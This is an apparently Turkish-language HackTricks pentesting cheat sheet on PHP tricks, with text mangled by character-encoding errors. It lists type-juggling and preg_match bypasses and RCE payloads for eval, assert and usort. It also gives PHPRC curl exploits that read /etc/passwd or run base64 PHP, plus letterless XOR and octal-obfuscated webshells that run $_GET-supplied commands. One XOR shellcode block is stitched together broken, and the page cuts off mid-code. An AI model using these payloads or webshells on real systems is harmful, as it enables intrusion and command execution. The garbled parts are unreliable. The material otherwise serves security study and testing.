# PHP Ä°puÃ§larÄ±

<details>

<summary><strong>SÄ±fÄ±rdan kahraman olmaya kadar AWS hacklemeyi Ã¶ÄŸrenin</strong> <a href="https://training.hacktricks.xyz/courses/arte"><strong>htARTE (HackTricks AWS Red Team Expert)</strong></a><strong>!</strong></summary>

HackTricks'Ä± desteklemenin diÄŸer yollarÄ±:

* **Åirketinizi HackTricks'te reklamÄ±nÄ± gÃ¶rmek istiyorsanÄ±z** veya **HackTricks'i PDF olarak indirmek istiyorsanÄ±z** [**ABONELÄ°K PLANLARI**]'na(https://github.com/sponsors/carlospolop) gÃ¶z atÄ±n!
* [**Resmi PEASS & HackTricks Ã¼rÃ¼nlerini**](https://peass.creator-spring.com) edinin
* [**The PEASS Family**]'yi(https://opensea.io/collection/the-peass-family) keÅŸfedin, Ã¶zel [**NFT'lerimiz**]'i(https://opensea.io/collection/the-peass-family) iÃ§eren koleksiyonumuz
* **KatÄ±lÄ±n** ğŸ’¬ [**Discord grubuna**](https://discord.gg/hRep4RUj7f) veya [**telegram grubuna**](https://t.me/peass) veya bizi **Twitter** ğŸ¦ [**@carlospolopm**](https://twitter.com/hacktricks\_live)**'da takip edin.**
* **Hacking ipuÃ§larÄ±nÄ±zÄ± paylaÅŸarak PR gÃ¶ndererek** [**HackTricks**](https://github.com/carlospolop/hacktricks) ve [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github depolarÄ±na katkÄ±da bulunun.

</details>

<figure><img src="../../..https://pentest.eu/RENDER_WebSec_10fps_21sec_9MB_29042024.gif" alt=""><figcaption></figcaption></figure>

{% embed url="https://websec.nl/" %}

## Ã‡erezlerin yaygÄ±n konumu:

Bu aynÄ± zamanda phpMyAdmin Ã§erezleri iÃ§in de geÃ§erlidir.

Ã‡erezler:
```
PHPSESSID
phpMyAdmin
```
Konumlar:
```
/var/lib/php/sessions
/var/lib/php5/
/tmp/
Example: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e
```
## PHP KarÅŸÄ±laÅŸtÄ±rmalarÄ±nÄ± Atlatma

### GevÅŸek karÅŸÄ±laÅŸtÄ±rmalar/TÃ¼r DÃ¶nÃ¼ÅŸÃ¼mÃ¼ ( == )

EÄŸer PHP'de `==` kullanÄ±lÄ±yorsa, beklenmeyen durumlar olabilir ve karÅŸÄ±laÅŸtÄ±rma beklenildiÄŸi gibi davranmayabilir. Bu, "==" sadece aynÄ± tÃ¼re dÃ¶nÃ¼ÅŸtÃ¼rÃ¼len deÄŸerleri karÅŸÄ±laÅŸtÄ±rÄ±r, eÄŸer karÅŸÄ±laÅŸtÄ±rÄ±lan verinin tÃ¼rÃ¼nÃ¼n de aynÄ± olduÄŸunu karÅŸÄ±laÅŸtÄ±rmak istiyorsanÄ±z `===` kullanmanÄ±z gerekir.

PHP karÅŸÄ±laÅŸtÄ±rma tablolarÄ±: [https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)

![](<../../../.gitbook/assets/image (564).png>)

{% file src="../../../.gitbook/assets/EN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf" %}

* `"string" == 0 -> True` Bir sayÄ± ile baÅŸlamayan bir dize bir sayÄ±ya eÅŸittir
* `"0xAAAA" == "43690" -> True` OnaltÄ±lÄ±k veya ondalÄ±k formatÄ±ndaki sayÄ±lardan oluÅŸan dizeler, diÄŸer sayÄ±lar/dizelerle karÅŸÄ±laÅŸtÄ±rÄ±labilir ve sayÄ±lar aynÄ±ysa sonuÃ§ True olur (bir dizideki sayÄ±lar sayÄ± olarak yorumlanÄ±r)
* `"0e3264578" == 0 --> True` "0e" ile baÅŸlayan ve herhangi bir ÅŸeyi takip eden bir dize 0'a eÅŸit olacaktÄ±r
* `"0X3264578" == 0X --> True` "0" ile baÅŸlayan ve herhangi bir harfi takip eden (X herhangi bir harf olabilir) ve herhangi bir ÅŸeyi takip eden bir dize 0'a eÅŸit olacaktÄ±r
* `"0e12334" == "0" --> True` Bu Ã§ok ilginÃ§ Ã§Ã¼nkÃ¼ bazÄ± durumlarda "0" ile baÅŸlayan ve karÅŸÄ±laÅŸtÄ±rÄ±lan veriye eÅŸit olan bir dize girdisi ve bazÄ± iÃ§erikleri kontrol edebilirsiniz. Bu nedenle, "0e" ile baÅŸlayan ve herhangi bir harf iÃ§ermeyen bir karmayÄ± oluÅŸturacak bir deÄŸer saÄŸlayabilirseniz, karÅŸÄ±laÅŸtÄ±rmayÄ± atlayabilirsiniz. Bu formatta **zaten karmalanmÄ±ÅŸ dizeleri** burada bulabilirsiniz: [https://github.com/spaze/hashes](https://github.com/spaze/hashes)
* `"X" == 0 --> True` Bir dizideki herhangi bir harf, int 0'a eÅŸittir

Daha fazla bilgi iÃ§in [https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09)

### **in\_array()**

**TÃ¼r DÃ¶nÃ¼ÅŸÃ¼mÃ¼**, varsayÄ±lan olarak `in_array()` iÅŸlevini de etkiler (katÄ± bir karÅŸÄ±laÅŸtÄ±rma yapmak iÃ§in Ã¼Ã§Ã¼ncÃ¼ argÃ¼manÄ± true olarak ayarlamanÄ±z gerekir):
```php
$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
```
### strcmp()/strcasecmp()

EÄŸer bu fonksiyon **herhangi bir kimlik doÄŸrulama kontrolÃ¼** iÃ§in kullanÄ±lÄ±yorsa (Ã¶rneÄŸin ÅŸifre kontrolÃ¼) ve kullanÄ±cÄ± karÅŸÄ±laÅŸtÄ±rmanÄ±n bir tarafÄ±nÄ± kontrol ediyorsa, ÅŸifre deÄŸeri olarak bir dizi yerine boÅŸ bir dizi gÃ¶nderebilir (`https://ornek.com/giris.php/?kullaniciadi=admin&sifre[]=`) ve bu kontrolÃ¼ atlayabilir:
```php
if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
```
### KatÄ± tÃ¼r JonglajÄ±

`strcasecmp()` ile aynÄ± hata meydana gelir

EÄŸer `===` kullanÄ±lÄ±yorsa bile, karÅŸÄ±laÅŸtÄ±rmanÄ±n **tÃ¼r jonglajÄ±na karÅŸÄ± savunmasÄ±z** olabileceÄŸi hatalar olabilir. Ã–rneÄŸin, karÅŸÄ±laÅŸtÄ±rma **veriyi karÅŸÄ±laÅŸtÄ±rmadan Ã¶nce farklÄ± bir nesne tÃ¼rÃ¼ne dÃ¶nÃ¼ÅŸtÃ¼rÃ¼yorsa**:
```php
(int) "1abc" === (int) "1xyz" //This will be true
```
### preg\_match(/^.\*/)

**`preg_match()`** kullanÄ±cÄ± giriÅŸini **doÄŸrulamak** iÃ§in kullanÄ±labilir (herhangi bir **kelime/regex**'in **kara listesinde** olup olmadÄ±ÄŸÄ±nÄ± **kontrol eder** ve eÄŸer deÄŸilse, kod iÅŸlemini sÃ¼rdÃ¼rebilir).

#### Yeni satÄ±r atlatma

Ancak, regexp'in baÅŸlangÄ±cÄ±nÄ± sÄ±nÄ±rlarken `preg_match()` sadece kullanÄ±cÄ± giriÅŸinin ilk satÄ±rÄ±nÄ± kontrol eder, sonra eÄŸer bir ÅŸekilde giriÅŸi **birkaÃ§ satÄ±rda gÃ¶nderebilirseniz**, bu kontrolÃ¼ atlayabilirsiniz. Ã–rnek:
```php
$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
```
Bu kontrolÃ¼ atlatmak iÃ§in deÄŸeri **yeni satÄ±rlarla urlencoded** (`%0A`) gÃ¶nderebilirsiniz veya **JSON verisi** gÃ¶nderebiliyorsanÄ±z, bunu **birkaÃ§ satÄ±rda** gÃ¶nderin:
```php
{
"cmd": "cat /etc/passwd"
}
```
Ã–rnek bulun: [https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)

#### **Uzunluk hatasÄ± atlatma**

(Bu atlatma, gÃ¶rÃ¼nÃ¼ÅŸe gÃ¶re PHP 5.2.5'te denenmiÅŸ ve PHP 7.3.15'te Ã§alÄ±ÅŸtÄ±rÄ±lamamÄ±ÅŸtÄ±r)\
EÄŸer `preg_match()`'e geÃ§erli Ã§ok **bÃ¼yÃ¼k bir giriÅŸ** gÃ¶nderebilirseniz, **iÅŸleyemez** ve kontrolÃ¼ **atlayabilirsiniz**. Ã–rneÄŸin, eÄŸer JSON'u karalistelediyse ÅŸunu gÃ¶nderebilirsiniz:
```bash
payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000001 + '"}'
```
#### ReDoS Atlatma

Hile kaynaÄŸÄ±: [https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223](https://simones-organization-4.gitbook.io/hackbook-of-a-hacker/ctf-writeups/intigriti-challenges/1223) ve [https://mizu.re/post/pong](https://mizu.re/post/pong)

<figure><img src="../../../.gitbook/assets/image (23).png" alt=""><figcaption></figcaption></figure>

KÄ±sacasÄ±, sorun, PHP'deki `preg_*` fonksiyonlarÄ±nÄ±n [PCRE kÃ¼tÃ¼phanesi](http://www.pcre.org/) Ã¼zerine kurulmasÄ± nedeniyle oluÅŸur. PCRE'de belirli dÃ¼zenli ifadeler, Ã§ok sayÄ±da Ã¶zyineli Ã§aÄŸrÄ± kullanÄ±larak eÅŸleÅŸtirilir ve bu da Ã§ok miktarda yÄ±ÄŸÄ±n alanÄ± tÃ¼ketir. Ã–zyineli Ã§aÄŸrÄ±lara izin verilen miktar Ã¼zerinde bir sÄ±nÄ±r belirlemek mÃ¼mkÃ¼ndÃ¼r, ancak PHP'de bu sÄ±nÄ±r [varsayÄ±lan olarak 100.000'dir](http://php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) ve yÄ±ÄŸÄ±n alanÄ±na sÄ±ÄŸmaktan daha fazladÄ±r.

Bu sorun hakkÄ±nda daha detaylÄ± konuÅŸulan yazÄ±da [Bu Stackoverflow konu baÅŸlÄ±ÄŸÄ±](http://stackoverflow.com/questions/7620910/regexp-in-preg-match-function-returning-browser-error) da paylaÅŸÄ±lmÄ±ÅŸtÄ±r. GÃ¶revimiz ÅŸimdi aÃ§Ä±ktÄ±:\
**Regex'in 100.000'den fazla Ã¶zyineli Ã§aÄŸrÄ± yapmasÄ±nÄ± saÄŸlayacak bir giriÅŸ gÃ¶ndermek, SIGSEGV'ye neden olacak ve `preg_match()` fonksiyonunun `false` dÃ¶ndÃ¼rmesini saÄŸlayarak uygulamanÄ±n giriÅŸimizin kÃ¶tÃ¼ niyetli olmadÄ±ÄŸÄ±nÄ± dÃ¼ÅŸÃ¼nmesini saÄŸlamak, yÃ¼klem sonunda `{system(<Ã§okkÃ¶tÃ¼kod>)}` gibi bir sÃ¼rpriz atmak ve SSTI --> RCE --> bayrak :) elde etmek**.

AslÄ±nda, regex terimleri aÃ§Ä±sÄ±ndan, gerÃ§ekte 100k "Ã¶zyineli Ã§aÄŸrÄ±" yapmÄ±yoruz, ancak "geri izleme adÄ±mlarÄ±nÄ±" sayÄ±yoruz, ki bu da [PHP belgelerinde](https://www.php.net/manual/en/pcre.configuration.php#ini.pcre.recursion-limit) belirtildiÄŸi gibi `pcre.backtrack_limit` deÄŸiÅŸkeninde varsayÄ±lan olarak 1.000.000 (1M) olur.\
Buna ulaÅŸmak iÃ§in, `'X'*500_001` 1 milyon geri izleme adÄ±mÄ±na (500k ileri ve 500k geri) yol aÃ§acaktÄ±r:
```python
payload = f"@dimariasimone on{'X'*500_001} {{system('id')}}"
```
### PHP obfuscation iÃ§in TÃ¼rkÃ§e Karakter Dizisi DÃ¶nÃ¼ÅŸÃ¼mÃ¼
```php
$obfs = "1"; //string "1"
$obfs++; //int 2
$obfs += 0.2; //float 2.2
$obfs = 1 + "7 IGNORE"; //int 8
$obfs = "string" + array("1.1 striiing")[0]; //float 1.1
$obfs = 3+2 * (TRUE + TRUE); //int 7
$obfs .= ""; //string "7"
$obfs += ""; //int 7
```
## YÃ¶nlendirmeden Sonra YÃ¼rÃ¼t (EAR)

EÄŸer PHP baÅŸka bir sayfaya yÃ¶nlendiriyorsa ancak **`die`** veya **`exit`** fonksiyonu **`Location`** baÅŸlÄ±ÄŸÄ± ayarlandÄ±ktan sonra Ã§aÄŸrÄ±lmamÄ±ÅŸsa, PHP yÃ¼rÃ¼tmeye devam eder ve verileri gÃ¶vdeye ekler:
```php
<?php
// In this page the page will be read and the content appended to the body of
// the redirect response
$page = $_GET['page'];
header('Location: /index.php?page=default.html');
readfile($page);
?>
```
## Yol Traversal ve Dosya Dahil Etme SÃ¶mÃ¼rÃ¼sÃ¼

Kontrol et:

{% content-ref url="../../../pentesting-web/file-inclusion/" %}
[file-inclusion](../../../pentesting-web/file-inclusion/)
{% endcontent-ref %}

## Daha fazla hile

* **register\_globals**: **PHP < 4.1.1.1** sÃ¼rÃ¼mlerinde veya yanlÄ±ÅŸ yapÄ±landÄ±rÄ±lmÄ±ÅŸsa, **register\_globals** etkin olabilir (veya davranÄ±ÅŸlarÄ± taklit ediliyor olabilir). Bu, global deÄŸiÅŸkenlerde $\_GET gibi bir deÄŸer varsa Ã¶rneÄŸin $\_GET\["param"]="1234", bu deÄŸere **$param** Ã¼zerinden eriÅŸebilirsiniz. Bu nedenle, HTTP parametreleri gÃ¶ndererek kod iÃ§inde kullanÄ±lan deÄŸiÅŸkenleri **Ã¼zerine yazabilirsiniz**.
* **AynÄ± alanÄ±n PHPSESSION Ã§erezleri aynÄ± yerde saklanÄ±r**, bu nedenle bir alan iÃ§inde **farklÄ± yollarla farklÄ± Ã§erezler kullanÄ±lÄ±yorsa** bir yolun, diÄŸer yolun Ã§erezine eriÅŸmesini saÄŸlayabilirsiniz. Bu ÅŸekilde **her iki yol da aynÄ± isimde bir deÄŸiÅŸkene eriÅŸirse**, bu deÄŸiÅŸkenin deÄŸerini yol1'de uygulayabilirsiniz. Ve ardÄ±ndan yol2, yol1'in deÄŸiÅŸkenlerini geÃ§erli kabul eder (Ã§erezin adÄ±nÄ± yol2'de karÅŸÄ±lÄ±k gelen adÄ± vererek).
* Makinenin kullanÄ±cÄ± adlarÄ±nÄ± elde ettiÄŸinizde, **kullanÄ±cÄ±larÄ±n adreslerini kontrol edin: /~\<KULLANICIADÄ±>** ve php dizinlerinin etkin olup olmadÄ±ÄŸÄ±nÄ± gÃ¶rÃ¼n.
* [**Php sargÄ±larÄ± kullanarak LFI ve RCE**](../../../pentesting-web/file-inclusion/)

### password\_hash/password\_verify

Bu fonksiyonlar genellikle PHP'de **ÅŸifrelerden hash'ler oluÅŸturmak** ve bir ÅŸifrenin bir hash ile karÅŸÄ±laÅŸtÄ±rÄ±ldÄ±ÄŸÄ±nda doÄŸru olup olmadÄ±ÄŸÄ±nÄ± **kontrol etmek** iÃ§in kullanÄ±lÄ±r. Desteklenen algoritmalar: `PASSWORD_DEFAULT` ve `PASSWORD_BCRYPT` (baÅŸlangÄ±cÄ± `$2y$`). **PASSWORD\_DEFAULT'Ä±n genellikle PASSWORD\_BCRYPT ile aynÄ± olduÄŸunu** unutmayÄ±n. Ve ÅŸu anda, **PASSWORD\_BCRYPT'Ä±n 72 bayt giriÅŸ boyutunda bir sÄ±nÄ±rlamasÄ±** vardÄ±r. Bu nedenle, bu algoritmayla 72 bayttan bÃ¼yÃ¼k bir ÅŸeyi hashlemeye Ã§alÄ±ÅŸtÄ±ÄŸÄ±nÄ±zda sadece ilk 72B kullanÄ±lacaktÄ±r:
```php
$cont=71; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
False

$cont=72; echo password_verify(str_repeat("a",$cont), password_hash(str_repeat("a",$cont)."b", PASSW
True
```
### HTTP baÅŸlÄ±klarÄ± atlatarak PHP hatalarÄ±nÄ± istismar etme

EÄŸer bir **PHP sayfasÄ± hatalarÄ± yazdÄ±rÄ±yor ve kullanÄ±cÄ± tarafÄ±ndan saÄŸlanan bazÄ± girdileri geri dÃ¶ndÃ¼rÃ¼yorsa**, kullanÄ±cÄ± PHP sunucusunun geri **bazÄ± iÃ§erikleri yeterince uzun** yazdÄ±rmasÄ±nÄ± saÄŸlayarak sunucunun cevaba **baÅŸlÄ±klarÄ± eklemeye Ã§alÄ±ÅŸtÄ±ÄŸÄ±nda hata fÄ±rlatacaÄŸÄ±nÄ±** yapabilir.\
AÅŸaÄŸÄ±daki senaryoda **saldÄ±rgan sunucunun bÃ¼yÃ¼k hatalar fÄ±rlatmasÄ±nÄ± saÄŸladÄ±**, ve ekran gÃ¶rÃ¼ntÃ¼sÃ¼nde gÃ¶rebileceÄŸiniz gibi PHP **baÅŸlÄ±k bilgilerini deÄŸiÅŸtirmeye Ã§alÄ±ÅŸtÄ±ÄŸÄ±nda** (Ã¶rneÄŸin CSP baÅŸlÄ±ÄŸÄ± kullanÄ±cÄ±ya gÃ¶nderilmedi):

![](<../../../.gitbook/assets/image (1082).png>)

## Kod yÃ¼rÃ¼tme

**system("ls");**\
**\`ls\`;**\
**shell\_exec("ls");**

[Daha fazla faydalÄ± PHP fonksiyonu iÃ§in buraya bakÄ±n](php-useful-functions-disable\_functions-open\_basedir-bypass/)
```php
preg_replace(pattern,replace,base)
preg_replace("/a/e","phpinfo()","whatever")
```
"replace" argÃ¼manÄ±ndaki kodu yÃ¼rÃ¼tmek iÃ§in en az bir eÅŸleÅŸmeye ihtiyaÃ§ vardÄ±r. Bu preg\_replace seÃ§eneÄŸi **PHP 5.5.0'den itibaren kullanÄ±mdan kaldÄ±rÄ±lmÄ±ÅŸtÄ±r.**

### **Eval() AracÄ±lÄ±ÄŸÄ±yla Uzaktan Kod Ã‡alÄ±ÅŸtÄ±rma (RCE)**
```
'.system('uname -a'); $dummy='
'.system('uname -a');#
'.system('uname -a');//
'.phpinfo().'
<?php phpinfo(); ?>
```
### **Assert() ile RCE**

Bu php iÃ§indeki fonksiyon, bir dize iÃ§inde yazÄ±lmÄ±ÅŸ kodu **Ã§alÄ±ÅŸtÄ±rmanÄ±za** olanak tanÄ±r ve sonucuna baÄŸlÄ± olarak iÅŸlemi deÄŸiÅŸtirmenize olanak saÄŸlar. Genellikle kullanÄ±cÄ± deÄŸiÅŸkeni dizenin ortasÄ±na yerleÅŸtirilir. Ã–rneÄŸin:\
`assert("strpos($_GET['page']),'..') === false")` --> Bu durumda **RCE** elde etmek iÃ§in ÅŸunu yapabilirsiniz:
```
?page=a','NeVeR') === false and system('ls') and strpos('a
```
### **usort() ile Uzaktan Kod Ã‡alÄ±ÅŸtÄ±rma (RCE)**

Bu fonksiyon, belirli bir iÅŸlevi kullanarak Ã¶ÄŸelerin bir dizisini sÄ±ralamak iÃ§in kullanÄ±lÄ±r.\
Bu fonksiyonu kÃ¶tÃ¼ye kullanmak iÃ§in:
```php
<?php usort(VALUE, "cmp"); #Being cmp a valid function ?>
VALUE: );phpinfo();#

<?php usort();phpinfo();#, "cmp"); #Being cmp a valid function ?>
```

```php
<?php
function foo($x,$y){
usort(VALUE, "cmp");
}?>
VALUE: );}[PHP CODE];#

<?php
function foo($x,$y){
usort();}phpinfo;#, "cmp");
}?>
```
### **KapanÄ±ÅŸ Parantez SayÄ±sÄ±nÄ± KeÅŸfetme**

KapatmanÄ±z gereken parantez sayÄ±sÄ±nÄ± keÅŸfetmek iÃ§in **//** kullanabilirsiniz:

- `?order=id;}//`: Bir hata mesajÄ± alÄ±rÄ±z (`Parse error: syntax error, unexpected ';'`). Muhtemelen bir veya daha fazla parantez eksik.
- `?order=id);}//`: Bir **uyarÄ±** alÄ±rÄ±z. Bu doÄŸru gibi gÃ¶rÃ¼nÃ¼yor.
- `?order=id));}//`: Bir hata mesajÄ± alÄ±rÄ±z (`Parse error: syntax error, unexpected ')' i`). Muhtemelen fazla kapanÄ±ÅŸ parantezimiz var.

### **.httaccess Ãœzerinden RCE**

EÄŸer bir **.htaccess** dosyasÄ± **yÃ¼kleyebilirseniz**, birÃ§ok ÅŸeyi yapÄ±landÄ±rabilir ve hatta kodu **Ã§alÄ±ÅŸtÄ±rabilirsiniz** (bu dosyalarÄ±n uzantÄ±sÄ± .htaccess olanlarÄ±n **Ã§alÄ±ÅŸtÄ±rÄ±labileceÄŸi ÅŸekilde yapÄ±landÄ±rÄ±labilir**).

FarklÄ± .htaccess kabuklarÄ±na [buradan](https://github.com/wireghoul/htshells) ulaÅŸÄ±labilir.

### **Env DeÄŸiÅŸkenleri Ãœzerinden RCE**

EÄŸer **PHP'de env deÄŸiÅŸkenlerini deÄŸiÅŸtirmenize izin veren bir zayÄ±flÄ±k bulursanÄ±z** (ve baÅŸka bir dosya yÃ¼kleme zayÄ±flÄ±ÄŸÄ± da bulursanÄ±z, daha fazla araÅŸtÄ±rma ile bunun atlatÄ±labileceÄŸi belki), bu davranÄ±ÅŸÄ± **RCE** elde etmek iÃ§in kullanabilirsiniz.

- [**`LD_PRELOAD`**](../../../linux-hardening/privilege-escalation/#ld\_preload-and-ld\_library\_path): Bu env deÄŸiÅŸkeni, diÄŸer ikili dosyalarÄ± Ã§alÄ±ÅŸtÄ±rÄ±rken keyfi kÃ¼tÃ¼phaneleri yÃ¼klemenize izin verir (ancak bu durumda iÅŸe yaramayabilir).
- **`PHPRC`** : PHP'ye **yapÄ±landÄ±rma dosyasÄ±nÄ± nerede bulacaÄŸÄ±nÄ± sÃ¶yler**, genellikle `php.ini` olarak adlandÄ±rÄ±lÄ±r. Kendi yapÄ±landÄ±rma dosyanÄ±zÄ± yÃ¼kleyebiliyorsanÄ±z, o zaman, PHP'yi bu dosyaya yÃ¶nlendirmek iÃ§in `PHPRC`'yi kullanÄ±n. Ä°kinci yÃ¼klenen bir dosyayÄ± belirten **`auto_prepend_file`** girdisini ekleyin. Bu ikinci dosya, normal **PHP kodunu iÃ§erir ve ardÄ±ndan PHP Ã§alÄ±ÅŸma zamanÄ± tarafÄ±ndan diÄŸer kodlardan Ã¶nce yÃ¼rÃ¼tÃ¼lÃ¼r**.
1. Kabuk kodumuzu iÃ§eren bir PHP dosyasÄ± yÃ¼kleyin
2. Ä°kinci bir dosya yÃ¼kleyin, adÄ±m 1'de yÃ¼klediÄŸimiz dosyayÄ± yÃ¼rÃ¼tmek iÃ§in PHP Ã¶n iÅŸleyicisine talimat veren bir **`auto_prepend_file`** yÃ¶nergesi iÃ§erir
3. `PHPRC` deÄŸiÅŸkenini adÄ±m 2'de yÃ¼klediÄŸimiz dosyaya ayarlayÄ±n.
- Bu zinciri nasÄ±l yÃ¼rÃ¼teceÄŸinizle ilgili daha fazla bilgiyi [**orijinal rapordan**](https://labs.watchtowr.com/cve-2023-36844-and-friends-rce-in-juniper-firewalls/) edinin.
- **PHPRC** - baÅŸka bir seÃ§enek
- EÄŸer **dosya yÃ¼kleyemiyorsanÄ±z**, FreeBSD'de "file" `/dev/fd/0`'Ä± kullanabilirsiniz, bu **`stdin`'i iÃ§eren** bir "file" olup, isteÄŸin **`stdin`'e gÃ¶nderilen gÃ¶vdesi** olur:
- `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary 'auto_prepend_file="/etc/passwd"'`
- Veya RCE elde etmek iÃ§in **`allow_url_include`**'Ä± etkinleÅŸtirin ve **base64 PHP kodu** iÃ§eren bir dosyayÄ± Ã¶ne ekleyin:
- `curl "http://10.12.72.1/?PHPRC=/dev/fd/0" --data-binary $'allow_url_include=1\nauto_prepend_file="data://text/plain;base64,PD8KICAgcGhwaW5mbygpOwo/Pg=="'`
- Teknik [**bu rapordan**](https://vulncheck.com/blog/juniper-cve-2023-36845).

## PHP Statik analiz

Bu fonksiyonlara Ã§aÄŸrÄ±lar iÃ§ine kod ekleyip ekleyemediÄŸinizi kontrol edin ([buradan](https://www.youtube.com/watch?v=SyWUsN0yHKI\&feature=youtu.be)):
```php
exec, shell_exec, system, passthru, eval, popen
unserialize, include, file_put_cotents
$_COOKIE | if #This mea
```
EÄŸer bir PHP uygulamasÄ±nÄ± hata ayÄ±klÄ±yorsanÄ±z, `/etc/php5/apache2/php.ini` dosyasÄ±na `display_errors = On` ekleyerek hata yazdÄ±rmayÄ± global olarak etkinleÅŸtirebilir ve apache'yi yeniden baÅŸlatabilirsiniz: `sudo systemctl restart apache2`

### PHP Kodunu Deobfuscating

PHP kodunu deobfuscate etmek iÃ§in **web**[ **www.unphp.net**](http://www.unphp.net) **adresini kullanabilirsiniz.**

## PHP Wrappers & Protocols

PHP Wrappers ve protokoller, bir sistemin yazma ve okuma korumalarÄ±nÄ± **atlaymanÄ±za** ve onu tehlikeye atmanÄ±za olanak tanÄ±yabilir. [**Daha fazla bilgi iÃ§in bu sayfaya**](../../../pentesting-web/file-inclusion/#lfi-rfi-using-php-wrappers-and-protocols) **bakÄ±n.**

## Xdebug kimlik doÄŸrulamasÄ±z RCE

EÄŸer bir `phpconfig()` Ã§Ä±ktÄ±sÄ±nda **Xdebug**'in **etkin** olduÄŸunu gÃ¶rÃ¼rseniz, RCE elde etmeyi denemelisiniz: [https://github.com/nqxcode/xdebug-exploit](https://github.com/nqxcode/xdebug-exploit)

## DeÄŸiÅŸken deÄŸiÅŸkenler
```php
$x = 'Da';
$$x = 'Drums';

echo $x; //Da
echo $$x; //Drums
echo $Da; //Drums
echo "${Da}"; //Drums
echo "$x ${$x}"; //Da Drums
echo "$x ${Da}"; //Da Drums
```
## Yeni $\_GET\["a"]\($\_GET\["b"]) kÃ¶tÃ¼ye kullanarak RCE

EÄŸer bir sayfada **keyfi bir sÄ±nÄ±fÄ±n yeni bir nesnesini oluÅŸturabiliyorsanÄ±z**, RCE elde edebilirsiniz, nasÄ±l yapÄ±lacaÄŸÄ±nÄ± Ã¶ÄŸrenmek iÃ§in aÅŸaÄŸÄ±daki sayfayÄ± kontrol edin:

{% content-ref url="php-rce-abusing-object-creation-new-usd_get-a-usd_get-b.md" %}
[php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md](php-rce-abusing-object-creation-new-usd\_get-a-usd\_get-b.md)
{% endcontent-ref %}

## Harfler olmadan PHP Ã§alÄ±ÅŸtÄ±rma

[https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/](https://securityonline.info/bypass-waf-php-webshell-without-numbers-letters/)

### SekizliÄŸi kullanarak
```php
$_="\163\171\163\164\145\155(\143\141\164\40\56\160\141\163\163\167\144)"; #system(cat .passwd);
```
### **XOR**

XOR, Ä°ngilizce "exclusive or" kelimelerinin kÄ±saltmasÄ±dÄ±r. Bu iÅŸlem, iki bitin deÄŸerlerini karÅŸÄ±laÅŸtÄ±rÄ±r ve sadece biri 1 ise sonuÃ§ 1 olur. Aksi takdirde sonuÃ§ 0 olur. Bu iÅŸlem, veri ÅŸifreleme ve karÅŸÄ±laÅŸtÄ±rma iÅŸlemlerinde sÄ±kÃ§a kullanÄ±lÄ±r.
```php
$_=("%28"^"[").("%33"^"[").("%34"^"[").("%2c"^"[").("%04"^"[").("%28"^"[").("%34"^"[").("%2e"^"[").("%29"^"[").("%38"^"[").("%3e"^"["); #show_source
$__=("%0f"^"!").("%2f"^"_").("%3e"^"_").("%2c"^"_").("%2c"^"_").("%28"^"_").("%3b"^"_"); #.passwd
$___=$__; #Could be not needed inside eval
$_($___); #If Â¢___ not needed then $_($__), show_source(.passwd)
```
### XOR basit kabuk kodu

[**Bu yazÄ±da**](https://mgp25.com/ctf/Web-challenge/) belirtildiÄŸine gÃ¶re, aÅŸaÄŸÄ±daki ÅŸekilde basit bir kabuk kodu oluÅŸturmak mÃ¼mkÃ¼ndÃ¼r:
```php
$_="`{{{"^"?<>/"; // $_ = '_GET';
${$_}[_](${$_}[__]); // $_GET[_]($_GET[__]);

$_="`{{{"^"?<>/";${$_}[_](${$_}[__]); // $_ = '_GET'; $_GET[_]($_GET[__]);
```
Yani, eÄŸer **sayÄ± ve harf olmadan keyfi PHP kodu Ã§alÄ±ÅŸtÄ±rabiliyorsanÄ±z**, aÅŸaÄŸÄ±daki gibi bir istek gÃ¶nderebilir ve keyfi PHP kodunu Ã§alÄ±ÅŸtÄ±rmak iÃ§in bu yÃ¼kÃ¼ istismar edebilirsiniz:
```
POST: /action.php?_=system&__=cat+flag.php
Content-Type: application/x-www-form-urlencoded

comando=$_="`{{{"^"?<>/";${$_}[_](${$_}[__]);
```
Daha detaylÄ± bir aÃ§Ä±klama iÃ§in [https://ctf-wiki.org/web/php/php/#preg\_match](https://ctf-wiki.org/web/php/php/#preg\_match)

### XOR Shellcode (eval iÃ§inde)
```bash
#!/bin/bash

if [[ -z $1 ]]; then
echo "USAGE: $0 CMD"
exit
fi

CMD=$1
CODE="\$_='\
```

```php
lt;>/'^'{{{{';\${\$_}[_](\${\$_}[__]);" `$_='
```

```php
lt;>/'^'{{{{'; --> _GET` `${$_}[_](${$_}[__]); --> $_GET[_]($_GET[__])` `So, the function is inside $_GET[_] and the parameter is inside $_GET[__]` http --form POST "http://victim.com/index.php?_=system&__=$CMD" "input=$CODE"
```
### Perl gibi
```php
<?php
$_=[];
$_=@"$_"; // $_='Array';
$_=$_['!'=='@']; // $_=$_[0];
$___=$_; // A
$__=$_;
$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;$__++;
$___.=$__; // S
$___.=$__; // S
$__=$_;
